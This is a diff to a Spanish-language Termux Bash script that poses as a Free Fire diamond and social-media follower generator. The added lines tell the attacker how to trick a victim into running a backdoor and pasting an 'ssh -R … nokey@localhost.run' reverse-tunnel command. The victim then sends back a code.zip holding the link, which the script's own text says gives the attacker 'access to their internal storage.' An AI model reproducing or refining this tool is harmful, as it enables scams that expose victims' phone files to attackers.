@@ -180,7 +180,7 @@ echo 'Al jugador se le esta agregando los Diamantes'
 echo ''
 echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter
 echo ''
-echo 'ssh -R 80:localhost:5443 nokey@localhost.run -q -yes'
+echo 'ssh -R 80:localhost:5443 nokey@localhost.run -q > code.zip'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -213,15 +213,15 @@ echo 'le decimos que escriba su ID del freefire y los diamantes '
 echo ''
 echo 'que desea agregar la victima  y le dicimos que de enter'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en .zip'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
-echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo 'despues de eso se le genera un archivo code.zip al le pedimos que nos envie'
 echo ''
-echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
-exit
+echo 'ese archivo, adentro de ese archivo esta el link con el que podemos ingresar y listo ya tenemos acceso a su almacenamiento interno'
 #
+exit
 ;;
 2)
 echo "
@@ -337,7 +337,7 @@ echo 'Al jugador se le esta agregando el PaseElite'
 echo ''
 echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter'
 echo ''
-echo 'ssh -R 80:localhost:5444 nokey@localhost.run -q -yes'
+echo 'ssh -R 80:localhost:5444 nokey@localhost.run -q > code.zip'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -368,15 +368,15 @@ echo 'y lo ejecute con bash el nombre del backdoor'
 echo ''
 echo 'Le pediremos que escriba su ID del freefire'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en .zip'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
-echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo 'despues de eso se le genera un archivo code.zip al le pedimos que nos envie'
 echo ''
-echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
-exit
+echo 'ese archivo, adentro de ese archivo esta el link con el que podemos ingresar y listo ya tenemos acceso a su almacenamiento interno'
 #
+exit
 ;;
 3)
 echo "
@@ -496,7 +496,7 @@ echo 'A usted se le esta agregando los Seguidores'
 echo ''
 echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter'
 echo ''
-echo 'ssh -R 80:localhost:5445 nokey@localhost.run -q -yes'
+echo 'ssh -R 80:localhost:5445 nokey@localhost.run -q > code.zip'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -527,15 +527,15 @@ echo 'y lo ejecute con bash el nombre del backdoor'
 echo ''
 echo 'decimos que ingrese su nombre del facebook y la cantidad de seguidores que desea tener'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en .zip'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
-echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo 'despues de eso se le genera un archivo code.zip al le pedimos que nos envie'
 echo ''
-echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
-exit
+echo 'ese archivo, adentro de ese archivo esta el link con el que podemos ingresar y listo ya tenemos acceso a su almacenamiento interno'
 #
+exit
 ;;
 4)
 echo "
@@ -655,7 +655,7 @@ echo 'A usted se le esta agregando los Seguidores'
 echo ''
 echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter'
 echo ''
-echo 'ssh -R 80:localhost:5446 nokey@localhost.run -q -yes'
+echo 'ssh -R 80:localhost:5446 nokey@localhost.run -q > code.zip'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -686,15 +686,15 @@ echo 'y lo ejecute con bash el nombre del backdoor'
 echo ''
 echo 'le decimos que ingrese su nombre de instagram y la cantidad de seguidores que desea tener'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en .zip'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
-echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo 'despues de eso se le genera un archivo code.zip al le pedimos que nos envie'
 echo ''
-echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
-exit
+echo 'ese archivo, adentro de ese archivo esta el link con el que podemos ingresar y listo ya tenemos acceso a su almacenamiento interno'
 #
+exit
 ;;
 5)
 echo "
@@ -814,7 +814,7 @@ echo 'A usted se le esta agregando los Seguidores'
 echo ''
 echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter'
 echo ''
-echo 'ssh -R 80:localhost:5447 nokey@localhost.run -q -yes'
+echo 'ssh -R 80:localhost:5447 nokey@localhost.run -q > code.zip'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -844,13 +844,13 @@ echo 'y lo ejecute con bash el nombre del backdoor'
 echo ''
 echo 'le decimos que ingrese su nombre del tiktok y la cantidad de seguidores que desea tener'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en .zip'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
-echo 'despues de eso se le genera un link al final le pedimos que nos envie'
+echo 'despues de eso se le genera un archivo code.zip al le pedimos que nos envie'
 echo ''
-echo 'el codigo que está a lado del link y listo ya tenemos acceso a su almacenamiento interno'
+echo 'ese archivo, adentro de ese archivo esta el link con el que podemos ingresar y listo ya tenemos acceso a su almacenamiento interno'
 #
 exit
 ;;
